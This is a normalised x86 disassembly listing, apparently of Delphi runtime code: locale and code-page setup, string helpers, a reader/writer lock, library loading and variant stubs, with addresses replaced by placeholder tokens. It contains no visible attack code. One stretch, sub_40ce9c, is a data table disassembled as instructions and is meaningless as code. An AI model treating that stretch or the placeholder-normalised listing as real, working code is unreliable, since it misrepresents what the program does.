push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40435c
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_402754
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40bda8
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40be20
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_40435c
mov edx esi
dec edx
call sub_40bda8
sub_40be5c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40415c
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40be84
pop esi
pop ebx
retn
mov eax ebx
call sub_40415c
mov esi eax
sub_40be84
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_40415c
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40c094
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40bedc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_40415c
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40c094
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40c094
dec eax
mov ebx eax
sub_40bf6c
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_40415c
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40bedc
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_40415c
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40bfd0
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_40415c
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_40415c
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40bedc
mov eax esi
call sub_40415c
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_40415c
mov [ esp ] eax
jmp r-xdata
sub_40c058
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_40435c
add eax esi
dec eax
call sub_40c030
sub_40c094
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_40435c
add eax ebx
dec eax
call sub_40c030
add eax ebx
sub_40c0d0
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_40435c
push eax
mov eax esi
call sub_40435c
mov ebp eax
mov eax ebp
pop edx
call sub_40c108
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40c108
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_4084a8
mov [ esp ] eax
mov eax ebp
call sub_4084a8
mov edi eax
mov edx ebp
mov eax esi
call sub_408640
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40be44
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_408640
mov ebx eax
inc ebx
sub_40c1a8
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40c1d0
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40c1d0
test eax eax
jne r-xdata
sub_40c1d0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_40862c
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40be44
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_40862c
mov edi eax
test edi edi
jne r-xdata
sub_40c210
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40c274
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_40410c
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_408018
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c27b
lea eax [ ebp - 0xc ]
call sub_403e9c
retn
sub_40c284
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40c210
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40c2fc
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40c2e4
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40c284
pop ecx
push ebp
call sub_40c284
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402c9c
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40c470
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40c73b
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40c2fc
call sub_40ad18
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40ac68
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403ef0
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40ac68
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_408018
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40ac68
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_408018
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40acb4
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40acb4
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40ac68
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_408018
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40acb4
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40ac68
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40afa0
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_403ef0
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40ac68
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40afa0
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_403ef0
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40acb4
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40ac68
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_403ef0
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40ac68
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_403ef0
lea eax [ ebp - 0x8 ]
call sub_403e9c
lea eax [ ebp - 0xc ]
call sub_403e9c
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40ac68
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_408018
test eax eax
jne r-xdata
call sub_40aef0
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f34
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f34
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_40421c
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_40421c
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40acb4
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c742
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_403ec0
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40ac68
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_408018
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40ac68
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_408018
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_403f34
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_403f34
jmp r-xdata
sub_40c7f0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40c880
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40ac1c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b51c
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_4038d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c887
lea eax [ ebp - 0x14 ]
call sub_403e9c
retn
sub_40c8d8
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_408434
mov [ rw-data ] eax
sub_40c95c
push ebx
push esi
push edi
push ebp
call sub_4034d8
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_402754
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_403154
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4034c0
sub_40c9c4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40c9ac
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40ca4c
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_407b34
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40c94c
mov [ ebp ] eax
sub_40ca4c
push ebx
mov ebx eax
mov eax ebx
call sub_40c9ac
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40c94c
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40ca8c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403134
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_40cb00
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov eax esi
call sub_40cb8c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403154
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_403164
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_40cb8c
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40cb48
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40c9c4
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40c954
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40c934
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40c954
test eax eax
je r-xdata
mov eax edi
call sub_40cb48
test bl bl
je r-xdata
mov eax edi
call sub_40cb7c
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40c934
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40c940
sub_40cc28
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40c9c4
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40c954
mov eax ebx
call sub_40cb60
mov eax ebx
call sub_40cb54
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40ca3c
sub_40cc78
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40c9c4
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40cb6c
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40c940
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40c934
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40cb6c
mov eax esi
call sub_40cb60
sub_40cce4
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40c9c4
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40ca3c
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40c934
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40cb60
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40cb60
sub_40cd5c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40cd80
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40cdf7
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_40575c
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_403218
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cdfe
lea eax [ ebp - 0x4 ]
call sub_40575c
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_403218
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40cd5c
test al al
jne r-xdata
mov al 0x1
sub_40ce18
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40ce8a
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40ce6c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40435c
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ce73
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40ce9c
sbb eax 0x4000000
xchg ebx eax
inc ebp
add [ ebx + eax - 0x6d03ffba ] dl
inc ebp
add [ eax - 0xbffb9fe ] bh
xchg edx eax
inc ebp
add [ eax ] bh
add [ esi ] eax
in al dx
xchg edx eax
inc ebp
add al bl
add eax [ esi ]
in al 0x92
inc ebp
add [ esp + eax ] cl
inc esi
add ah bl
xchg edx eax
inc ebp
add ah ch
add [ esi ] eax
aam 0x92
inc ebp
add [ eax - 0x33ffb9fe ] ah
xchg edx eax
inc ebp
add ah bh
add [ esi ] al
les edx [ edx + 0x2ec0045 ]
inc esi
add [ edx + edx * 4 + 0x3340045 ] bh
inc esi
add [ edx + edx * 4 + 0x2740045 ] dh
inc esi
add [ edx + edx * 4 + 0x27c0045 ] ch
inc esi
add [ edx + edx * 4 + 0x47c0045 ] ah
inc esi
add [ edx + edx * 4 + 0x2780045 ] bl
inc esi
add [ edx + edx * 4 + 0x4f00045 ] dl
inc esi
add [ edx + edx * 4 + 0x3700045 ] cl
inc esi
add [ edx + edx * 4 + 0x34c0045 ] al
inc esi
add [ edx + edx * 4 + 0x45 ] bh
add [ eax - 0x6d8bffba ] al
inc ebp
add [ eax + 0x6c004604 ] bh
xchg edx eax
inc ebp
add [ edx + eax - 0x6d9bffba ] cl
inc ebp
add [ esp + eax - 0x6da3ffba ] al
inc ebp
add [ eax + 0x54004604 ] dl
xchg edx eax
inc ebp
add ah dl
add [ esi ] eax
dec esp
xchg edx eax
inc ebp
add [ eax + 0x44004601 ] bl
xchg edx eax
inc ebp
add [ eax + 0x3 ] cl
inc esi
add [ edx + edx * 4 ] bh
inc ebp
add al dl
add eax [ esi ]
xor al 0x92
inc ebp
add [ eax ] cl
add [ esi ] eax
sub al 0x92
inc ebp
add [ eax + 0x4 ] bh
inc esi
add [ edx + edx * 4 ] ah
inc ebp
add [ eax + 0x28004602 ] cl
add [ eax ] al
add [ edx + edx * 4 ] bl
inc ebp
add [ esp + eax + 0x46 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] bl
xchg edx eax
inc ebp
add [ ecx + eax + 0x46 ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx * 4 ] dl
inc ebp
add ah al
add eax [ esi ]
add [ eax ] al
add [ eax ] al
adc [ edx + 0x1140045 ] dl
inc esi
add [ eax ] al
add [ eax ] al
add [ edx + edx * 4 ] cl
inc ebp
add [ eax + 0x4601 ] dh
add [ eax ] al
add [ eax ] cl
xchg edx eax
inc ebp
add [ eax + 0x4601 ] ch
add [ eax ] al
add [ edx + edx * 4 ] al
inc ebp
add [ ecx + eax + 0x46 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg edx eax
inc ebp
add [ edx + eax + 0x46 ] al
add [ eax ] al
cld
xchg ecx eax
inc ebp
add [ ebx + eax + 0x46 ] ch
add [ eax ] al
add [ eax ] al
add al bh
xchg ecx eax
inc ebp
add [ ecx + eax + 0x46 ] ch
add [ eax ] al
hlt
sub_40d2ec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40d354
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d35b
retn
mov eax sub_40ce9c
call sub_403c48
mov eax r-xdata
call sub_403c70
cmp [ rw-data ] 0x0
je r-xdata
call sub_40bb28
call sub_40bc2c
call sub_40c8d8
call sub_40c470
mov eax rw-data
mov edx r-xdata
call sub_403ef0
sub_40d38c
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40d3e0
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d43a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404124
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_408030
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d441
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_40d44c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d4a6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404124
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409344
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d4ad
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_40d4b8
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d512
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404124
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409318
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d519
